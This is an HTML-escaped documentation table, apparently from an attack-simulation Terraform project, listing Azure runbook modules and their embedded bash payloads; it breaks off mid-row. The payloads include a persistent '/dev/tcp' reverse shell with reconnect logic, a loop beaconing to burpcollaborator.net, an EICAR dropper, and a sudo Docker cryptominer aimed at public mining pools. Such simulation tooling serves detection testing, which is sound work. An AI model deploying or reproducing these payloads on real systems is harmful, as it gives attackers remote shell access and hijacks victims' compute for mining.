| target-runbook-connect-oast-host                         | ./modules/runbook/connect-oast-host                  | runbook_connect_oast_host                        | context.azure.runbook.target.connect.oast                         | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;target&quot;: {<br/>                    &quot;connect&quot;: {<br/>                        &quot;oast&quot;: {<br/>                            &quot;enabled&quot;: false,<br/>                            &quot;retry_delay_secs&quot;: 1800<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/connect-oast-host                  | <pre>locals &amp;&amp;#35;123;<br/>    oast&amp;&amp;#35;95;domain = &quot;burpcollaborator&amp;#46;net&quot;<br/>    payload = &lt;&lt;&amp;#45;EOT<br/>    START&amp;&amp;#35;95;HASH=$&amp;&amp;#35;40;sha256sum &amp;#45;&amp;#45;text /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME &amp;#124; awk &#x27;&amp;&amp;#35;123; print $1 &amp;&amp;#35;125;&#x27;&amp;&amp;#35;41;<br/>    while true; do<br/>        OAST&amp;&amp;#35;95;URL=&quot;https://$&amp;&amp;#35;40;cat /dev/urandom &amp;#124; tr &amp;#45;dc &#x27;&amp;&amp;#35;91;:lower:&amp;&amp;#35;93;&#x27; &amp;#124; fold &amp;#45;w $$&amp;&amp;#35;123;1:&amp;#45;16&amp;&amp;#35;125; &amp;#124; head &amp;#45;n 1&amp;&amp;#35;41;&amp;#46;$&amp;&amp;#35;123;local&amp;#46;oast&amp;&amp;#35;95;domain&amp;&amp;#35;125;&quot;<br/>        log &quot;http request: $OAST&amp;&amp;#35;95;URL&quot;<br/>        curl &amp;#45;s &quot;$OAST&amp;&amp;#35;95;URL&quot; &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        log &#x27;waiting $&amp;&amp;#35;123;var&amp;#46;inputs&amp;&amp;#35;91;&quot;retry&amp;&amp;#35;95;delay&amp;&amp;#35;95;secs&quot;&amp;&amp;#35;93;&amp;&amp;#35;125; seconds&amp;#46;&amp;#46;&amp;#46;&#x27;;<br/>        sleep $&amp;&amp;#35;123;var&amp;#46;inputs&amp;&amp;#35;91;&quot;retry&amp;&amp;#35;95;delay&amp;&amp;#35;95;secs&quot;&amp;&amp;#35;93;&amp;&amp;#35;125;<br/>        if &amp;#33; check&amp;&amp;#35;95;payload&amp;&amp;#35;95;update /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME $START&amp;&amp;#35;95;HASH; then<br/>            log &quot;payload update detected &amp;#45; exiting loop and forcing payload download&quot;<br/>            rm &amp;#45;f /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop&amp;#46;&amp;#46;&amp;#46;&quot;<br/>        fi<br/>    done<br/>    EOT<br/><br/>    base64&amp;&amp;#35;95;payload = templatefile&amp;&amp;#35;40;&quot;$&amp;&amp;#35;123;path&amp;#46;module&amp;&amp;#35;125;/&amp;#46;&amp;#46;/&amp;#46;&amp;#46;/delayed&amp;&amp;#35;95;start&amp;#46;sh&quot;, &amp;&amp;#35;123; config = &amp;&amp;#35;123;<br/>        script&amp;&amp;#35;95;name = var&amp;#46;inputs&amp;&amp;#35;91;&quot;tag&quot;&amp;&amp;#35;93;<br/>        log&amp;&amp;#35;95;rotation&amp;&amp;#35;95;count = 2<br/>        apt&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        apt&amp;&amp;#35;95;packages = &quot;&quot;<br/>        apt&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        yum&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks =  &quot;&quot;<br/>        yum&amp;&amp;#35;95;packages = &quot;&quot;<br/>        yum&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        script&amp;&amp;#35;95;delay&amp;&amp;#35;95;secs = 30<br/>        next&amp;&amp;#35;95;stage&amp;&amp;#35;95;payload = local&amp;#46;payload<br/>    &amp;&amp;#35;125;&amp;&amp;#35;125;&amp;&amp;#35;41;<br/><br/>    outputs = &amp;&amp;#35;123;<br/>        base64&amp;&amp;#35;95;payload = base64gzip&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload = base64encode&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload&amp;&amp;#35;95;additional = &amp;&amp;#35;91;&amp;&amp;#35;93;<br/>    &amp;&amp;#35;125;<br/>&amp;&amp;#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
| target-runbook-connect-reverse-shell                     | ./modules/runbook/connect-reverse-shell              | runbook_exec_reverse_shell                       | context.azure.runbook.target.connect.reverse_shell                | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;target&quot;: {<br/>                    &quot;connect&quot;: {<br/>                        &quot;reverse_shell&quot;: {<br/>                            &quot;enabled&quot;: false,<br/>                            &quot;host_ip&quot;: null,<br/>                            &quot;host_port&quot;: 4444<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/connect-reverse-shell              | <pre>locals &amp;&amp;#35;123;<br/>    host&amp;&amp;#35;95;ip = var&amp;#46;inputs&amp;&amp;#35;91;&quot;host&amp;&amp;#35;95;ip&quot;&amp;&amp;#35;93;<br/>    host&amp;&amp;#35;95;port = var&amp;#46;inputs&amp;&amp;#35;91;&quot;host&amp;&amp;#35;95;port&quot;&amp;&amp;#35;93;<br/><br/>    payload = &lt;&lt;&amp;#45;EOT<br/>    log &quot;attacker Host: $&amp;&amp;#35;123;local&amp;#46;host&amp;&amp;#35;95;ip&amp;&amp;#35;125;:$&amp;&amp;#35;123;local&amp;#46;host&amp;&amp;#35;95;port&amp;&amp;#35;125;&quot;<br/>    server=&quot;$&amp;&amp;#35;123;local&amp;#46;host&amp;&amp;#35;95;ip&amp;&amp;#35;125;&quot;<br/>    timeout=600<br/>    start&amp;&amp;#35;95;time=$&amp;&amp;#35;40;date &amp;#43;%s&amp;&amp;#35;41;<br/>    &amp;#35; Check if $server is an IP address<br/>    if &amp;&amp;#35;91;&amp;&amp;#35;91; $server =~ ^&amp;&amp;#35;91;0&amp;#45;9&amp;&amp;#35;93;&amp;#43;&amp;&amp;#35;92;&amp;#46;&amp;&amp;#35;91;0&amp;#45;9&amp;&amp;#35;93;&amp;#43;&amp;&amp;#35;92;&amp;#46;&amp;&amp;#35;91;0&amp;#45;9&amp;&amp;#35;93;&amp;#43;&amp;&amp;#35;92;&amp;#46;&amp;&amp;#35;91;0&amp;#45;9&amp;&amp;#35;93;&amp;#43;$ &amp;&amp;#35;93;&amp;&amp;#35;93;; then<br/>        log &quot;server is set to IP address $server, no need to resolve DNS&quot;<br/>    else<br/>        log &quot;checking dns resolution: $server&quot;<br/>        while true; do<br/>            ip=$&amp;&amp;#35;40;dig &amp;#43;short $server&amp;&amp;#35;41;<br/>            if &amp;&amp;#35;91; &amp;#45;z &quot;$ip&quot; &amp;&amp;#35;93;; then  &amp;#35; If $ip is empty, the domain hasn&#x27;t resolved yet<br/>                current&amp;&amp;#35;95;time=$&amp;&amp;#35;40;date &amp;#43;%s&amp;&amp;#35;41;<br/>                elapsed&amp;&amp;#35;95;time=$&amp;&amp;#35;40;&amp;&amp;#35;40;current&amp;&amp;#35;95;time &amp;#45; start&amp;&amp;#35;95;time&amp;&amp;#35;41;&amp;&amp;#35;41;<br/>                if &amp;&amp;#35;91; $elapsed&amp;&amp;#35;95;time &amp;#45;gt $timeout &amp;&amp;#35;93;; then<br/>                    echo &quot;DNS resolution for $server timed out after $timeout seconds&quot;<br/>                    exit 1<br/>                fi<br/>                sleep 1<br/>            else<br/>                echo &quot;$server resolved to $ip&quot;<br/>                break<br/>            fi<br/>        done<br/>    fi<br/>    START&amp;&amp;#35;95;HASH=$&amp;&amp;#35;40;sha256sum &amp;#45;&amp;#45;text /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME &amp;#124; awk &#x27;&amp;&amp;#35;123; print $1 &amp;&amp;#35;125;&#x27;&amp;&amp;#35;41;<br/>    while true; do<br/>        kill &amp;#45;9 $&amp;&amp;#35;40;ps aux &amp;#124; grep &#x27;/bin/bash &amp;#45;c bash &amp;#45;i&#x27; &amp;#124; head &amp;#45;1 &amp;#124; awk &#x27;&amp;&amp;#35;123; print $2 &amp;&amp;#35;125;&#x27;&amp;&amp;#35;41;<br/>        log &quot;running: /bin/bash &amp;#45;c &#x27;bash &amp;#45;i &gt;&amp; /dev/tcp/$&amp;&amp;#35;123;local&amp;#46;host&amp;&amp;#35;95;ip&amp;&amp;#35;125;/$&amp;&amp;#35;123;local&amp;#46;host&amp;&amp;#35;95;port&amp;&amp;#35;125; 0&gt;&amp;1&#x27;&quot;<br/>        while &amp;#33; /bin/bash &amp;#45;c &#x27;bash &amp;#45;i &gt;&amp; /dev/tcp/$&amp;&amp;#35;123;local&amp;#46;host&amp;&amp;#35;95;ip&amp;&amp;#35;125;/$&amp;&amp;#35;123;local&amp;#46;host&amp;&amp;#35;95;port&amp;&amp;#35;125; 0&gt;&amp;1&#x27;; do<br/>            log &quot;reconnecting: $&amp;&amp;#35;123;local&amp;#46;host&amp;&amp;#35;95;ip&amp;&amp;#35;125;:$&amp;&amp;#35;123;local&amp;#46;host&amp;&amp;#35;95;port&amp;&amp;#35;125;&quot;;<br/>            sleep 10;<br/>        done;<br/>        log &#x27;waiting 30 minutes&amp;#46;&amp;#46;&amp;#46;&#x27;;<br/>        sleep 1800<br/>        if &amp;#33; check&amp;&amp;#35;95;payload&amp;&amp;#35;95;update /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME $START&amp;&amp;#35;95;HASH; then<br/>            log &quot;payload update detected &amp;#45; exiting loop and forcing payload download&quot;<br/>            rm &amp;#45;f /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop&amp;#46;&amp;#46;&amp;#46;&quot;<br/>        fi<br/>    done<br/>    EOT<br/><br/>    base64&amp;&amp;#35;95;payload = templatefile&amp;&amp;#35;40;&quot;$&amp;&amp;#35;123;path&amp;#46;module&amp;&amp;#35;125;/&amp;#46;&amp;#46;/&amp;#46;&amp;#46;/delayed&amp;&amp;#35;95;start&amp;#46;sh&quot;, &amp;&amp;#35;123; config = &amp;&amp;#35;123;<br/>        script&amp;&amp;#35;95;name = var&amp;#46;inputs&amp;&amp;#35;91;&quot;tag&quot;&amp;&amp;#35;93;<br/>        log&amp;&amp;#35;95;rotation&amp;&amp;#35;95;count = 2<br/>        apt&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        apt&amp;&amp;#35;95;packages = &quot;&quot;<br/>        apt&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        yum&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks =  &quot;&quot;<br/>        yum&amp;&amp;#35;95;packages = &quot;&quot;<br/>        yum&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        script&amp;&amp;#35;95;delay&amp;&amp;#35;95;secs = 30<br/>        next&amp;&amp;#35;95;stage&amp;&amp;#35;95;payload = local&amp;#46;payload<br/>    &amp;&amp;#35;125;&amp;&amp;#35;125;&amp;&amp;#35;41;<br/><br/>    outputs = &amp;&amp;#35;123;<br/>        base64&amp;&amp;#35;95;payload = base64gzip&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload = base64encode&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload&amp;&amp;#35;95;additional = &amp;&amp;#35;91;&amp;&amp;#35;93;<br/>    &amp;&amp;#35;125;<br/>&amp;&amp;#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| target-runbook-drop-malware-eicar                        | ./modules/runbook/drop-malware-eicar                 | runbook_deploy_malware_eicar                     | context.azure.runbook.target.drop.malware.eicar                   | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;target&quot;: {<br/>                    &quot;drop&quot;: {<br/>                        &quot;malware&quot;: {<br/>                            &quot;eicar&quot;: {<br/>                                &quot;eicar_path&quot;: &quot;/tmp/eicar&quot;,<br/>                                &quot;enabled&quot;: false<br/>                            }<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/drop-malware-eicar                 | <pre>locals &amp;&amp;#35;123;<br/>    eicar&amp;&amp;#35;95;string&amp;&amp;#35;95;base64 = &quot;WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo=&quot;<br/>    eicar&amp;&amp;#35;95;path = var&amp;#46;inputs&amp;&amp;#35;91;&quot;eicar&amp;&amp;#35;95;path&quot;&amp;&amp;#35;93;<br/>    payload = &lt;&lt;&amp;#45;EOT<br/>    START&amp;&amp;#35;95;HASH=$&amp;&amp;#35;40;sha256sum &amp;#45;&amp;#45;text /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME &amp;#124; awk &#x27;&amp;&amp;#35;123; print $1 &amp;&amp;#35;125;&#x27;&amp;&amp;#35;41;<br/>    while true; do<br/>        log &quot;starting script&quot;<br/>        log &quot;creating eicar file: $&amp;&amp;#35;123;local&amp;#46;eicar&amp;&amp;#35;95;path&amp;&amp;#35;125;&amp;#45;$&amp;&amp;#35;40;hostname&amp;&amp;#35;41;&quot;<br/>        rm &amp;#45;rf $&amp;&amp;#35;123;local&amp;#46;eicar&amp;&amp;#35;95;path&amp;&amp;#35;125;&amp;&amp;#35;42;<br/>        echo &amp;#45;n &#x27;$&amp;&amp;#35;123;base64decode&amp;&amp;#35;40;local&amp;#46;eicar&amp;&amp;#35;95;string&amp;&amp;#35;95;base64&amp;&amp;#35;41;&amp;&amp;#35;125;&#x27; &gt; $&amp;&amp;#35;123;local&amp;#46;eicar&amp;&amp;#35;95;path&amp;&amp;#35;125;&amp;#45;$&amp;&amp;#35;40;hostname&amp;&amp;#35;41;<br/>        log &quot;$&amp;&amp;#35;40;ls &amp;#45;l $&amp;&amp;#35;123;local&amp;#46;eicar&amp;&amp;#35;95;path&amp;&amp;#35;125;&amp;#45;$&amp;&amp;#35;40;hostname&amp;&amp;#35;41;&amp;&amp;#35;41;&quot;<br/>        log &#x27;waiting 30 minutes&amp;#46;&amp;#46;&amp;#46;&#x27;;<br/>        sleep 1800<br/>        if &amp;#33; check&amp;&amp;#35;95;payload&amp;&amp;#35;95;update /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME $START&amp;&amp;#35;95;HASH; then<br/>            log &quot;payload update detected &amp;#45; exiting loop and forcing payload download&quot;<br/>            rm &amp;#45;f /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop&amp;#46;&amp;#46;&amp;#46;&quot;<br/>        fi<br/>    done<br/>    log &quot;Done&amp;#46;&quot;<br/>    EOT<br/>    <br/>    base64&amp;&amp;#35;95;payload = templatefile&amp;&amp;#35;40;&quot;$&amp;&amp;#35;123;path&amp;#46;module&amp;&amp;#35;125;/&amp;#46;&amp;#46;/&amp;#46;&amp;#46;/delayed&amp;&amp;#35;95;start&amp;#46;sh&quot;, &amp;&amp;#35;123; config = &amp;&amp;#35;123;<br/>        script&amp;&amp;#35;95;name = var&amp;#46;inputs&amp;&amp;#35;91;&quot;tag&quot;&amp;&amp;#35;93;<br/>        log&amp;&amp;#35;95;rotation&amp;&amp;#35;95;count = 2<br/>        apt&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        apt&amp;&amp;#35;95;packages = &quot;&quot;<br/>        apt&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        yum&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks =  &quot;&quot;<br/>        yum&amp;&amp;#35;95;packages = &quot;&quot;<br/>        yum&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        script&amp;&amp;#35;95;delay&amp;&amp;#35;95;secs = 30<br/>        next&amp;&amp;#35;95;stage&amp;&amp;#35;95;payload = local&amp;#46;payload<br/>    &amp;&amp;#35;125;&amp;&amp;#35;125;&amp;&amp;#35;41;<br/><br/>    outputs = &amp;&amp;#35;123;<br/>        base64&amp;&amp;#35;95;payload = base64gzip&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload = base64encode&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload&amp;&amp;#35;95;additional = &amp;&amp;#35;91;&amp;&amp;#35;93;<br/>    &amp;&amp;#35;125;<br/>&amp;&amp;#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| target-runbook-execute-docker-cpu-miner                  | ./modules/runbook/execute-docker-cpu-miner           | runbook_exec_docker_cpuminer                     | context.azure.runbook.target.execute.docker_cpu_miner             | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;target&quot;: {<br/>                    &quot;execute&quot;: {<br/>                        &quot;docker_cpu_miner&quot;: {<br/>                            &quot;enabled&quot;: false,<br/>                            &quot;minergate_image&quot;: &quot;mkell43/minerd&quot;,<br/>                            &quot;minergate_name&quot;: &quot;minerd&quot;,<br/>                            &quot;minergate_server&quot;: &quot;stratum+tcp://eth.pool.minergate.com:45791&quot;,<br/>                            &quot;minergate_user&quot;: null,<br/>                            &quot;nicehash_image&quot;: &quot;a2ncer/nheqminer_cpu:latest&quot;,<br/>                            &quot;nicehash_name&quot;: &quot;nicehash&quot;,<br/>                            &quot;nicehash_server&quot;: &quot;equihash.usa.nicehash.com:3357&quot;,<br/>                            &quot;nicehash_user&quot;: null<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                            | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/execute-docker-cpu-miner           | <pre>locals &amp;&amp;#35;123;<br/>    &amp;#35; nicehash&amp;&amp;#35;95;name = var&amp;#46;inputs&amp;&amp;#35;91;&quot;nicehash&amp;&amp;#35;95;name&quot;&amp;&amp;#35;93;<br/>    &amp;#35; nicehash&amp;&amp;#35;95;image = var&amp;#46;inputs&amp;&amp;#35;91;&quot;nicehash&amp;&amp;#35;95;image&quot;&amp;&amp;#35;93;<br/>    &amp;#35; nicehash&amp;&amp;#35;95;server = var&amp;#46;inputs&amp;&amp;#35;91;&quot;nicehash&amp;&amp;#35;95;server&quot;&amp;&amp;#35;93;<br/>    &amp;#35; nicehash&amp;&amp;#35;95;user = var&amp;#46;inputs&amp;&amp;#35;91;&quot;nicehash&amp;&amp;#35;95;user&quot;&amp;&amp;#35;93;<br/>    minergate&amp;&amp;#35;95;name = var&amp;#46;inputs&amp;&amp;#35;91;&quot;minergate&amp;&amp;#35;95;name&quot;&amp;&amp;#35;93;<br/>    minergate&amp;&amp;#35;95;image = var&amp;#46;inputs&amp;&amp;#35;91;&quot;minergate&amp;&amp;#35;95;image&quot;&amp;&amp;#35;93;<br/>    minergate&amp;&amp;#35;95;server = var&amp;#46;inputs&amp;&amp;#35;91;&quot;minergate&amp;&amp;#35;95;server&quot;&amp;&amp;#35;93;<br/>    minergate&amp;&amp;#35;95;user=var&amp;#46;inputs&amp;&amp;#35;91;&quot;minergate&amp;&amp;#35;95;user&quot;&amp;&amp;#35;93;<br/><br/>    payload = &lt;&lt;&amp;#45;EOT<br/>    START&amp;&amp;#35;95;HASH=$&amp;&amp;#35;40;sha256sum &amp;#45;&amp;#45;text /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME &amp;#124; awk &#x27;&amp;&amp;#35;123; print $1 &amp;&amp;#35;125;&#x27;&amp;&amp;#35;41;<br/>    while true; do<br/>        log &quot;starting script&quot;<br/>        if &amp;&amp;#35;91;&amp;&amp;#35;91; &amp;&amp;#35;96;sudo docker ps &amp;#124; grep $&amp;&amp;#35;123;local&amp;#46;minergate&amp;&amp;#35;95;name&amp;&amp;#35;125;&amp;&amp;#35;96; &amp;&amp;#35;93;&amp;&amp;#35;93;; then docker stop $&amp;&amp;#35;123;local&amp;#46;minergate&amp;&amp;#35;95;name&amp;&amp;#35;125;; fi<br/>        sudo docker run &amp;#45;&amp;#45;rm &amp;#45;d &amp;#45;&amp;#45;network=host &amp;#45;&amp;#45;name $&amp;&amp;#35;123;local&amp;#46;minergate&amp;&amp;#35;95;name&amp;&amp;#35;125; $&amp;&amp;#35;123;local&amp;#46;minergate&amp;&amp;#35;95;image&amp;&amp;#35;125; &amp;#45;a cryptonight &amp;#45;o $&amp;&amp;#35;123;local&amp;#46;minergate&amp;&amp;#35;95;server&amp;&amp;#35;125; &amp;#45;u $&amp;&amp;#35;123; local&amp;#46;minergate&amp;&amp;#35;95;user &amp;&amp;#35;125; &amp;#45;p x<br/>        sudo docker ps &amp;#45;a &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        log &#x27;waiting 30 minutes&amp;#46;&amp;#46;&amp;#46;&#x27;;<br/>        sleep 1800<br/>        if &amp;#33; check&amp;&amp;#35;95;payload&amp;&amp;#35;95;update /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME $START&amp;&amp;#35;95;HASH; then<br/>            log &quot;payload update detected &amp;#45; exiting loop and forcing payload download&quot;<br/>            rm &amp;#45;f /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop&amp;#46;&amp;#46;&amp;#46;&quot;<br/>        fi<br/>    done<br/>    log &quot;Done&amp;#46;&quot;<br/>    EOT<br/>    <br/>    base64&amp;&amp;#35;95;payload = templatefile&amp;&amp;#35;40;&quot;$&amp;&amp;#35;123;path&amp;#46;module&amp;&amp;#35;125;/&amp;#46;&amp;#46;/&amp;#46;&amp;#46;/delayed&amp;&amp;#35;95;start&amp;#46;sh&quot;, &amp;&amp;#35;123; config = &amp;&amp;#35;123;<br/>        script&amp;&amp;#35;95;name = var&amp;#46;inputs&amp;&amp;#35;91;&quot;tag&quot;&amp;&amp;#35;93;<br/>        log&amp;&amp;#35;95;rotation&amp;&amp;#35;95;count = 2<br/>        apt&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks = &lt;&lt;&amp;#45;EOT<br/>        log &quot;Checking for docker&amp;#46;&amp;#46;&amp;#46;&quot;<br/>        while &amp;#33; command &amp;#45;v docker &gt; /dev/null &amp;#124;&amp;#124; &amp;#33; docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready &amp;#45; waiting&quot;<br/>            sleep 